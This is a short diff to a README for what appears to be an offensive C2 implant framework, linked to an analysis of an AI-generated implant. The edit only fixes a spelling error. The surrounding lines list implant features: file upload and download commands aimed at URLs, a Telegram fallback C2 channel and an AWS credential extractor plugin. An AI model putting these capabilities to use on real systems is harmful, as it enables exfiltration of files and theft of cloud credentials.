@@ -21,7 +21,7 @@ https://www.ontinue.com/resource/voidlink-dissecting-an-ai-generated-c2-implant/
  - Download additional plugins on demand
  - Fallback Telegram C2
  - File upload (upload http://127.0.0.1:5000.com/upload ./example.txt) -> example.txt must be a path relative to the root of the orchestration folder
- - File download (download http://any-domain.com/example.txt ../../example.txt) -> Make sure you don't overidde anything in the orchestration folder by downloading file in there
+ - File download (download http://any-domain.com/example.txt ../../example.txt) -> Make sure you don't overide anything in the orchestration folder by downloading file in there
  - AWS Credential extractor on demand plugin read (./team_server/downloads/src/cloud/AWS/extract_credentials/golang/README.md)  
 
 ## Features
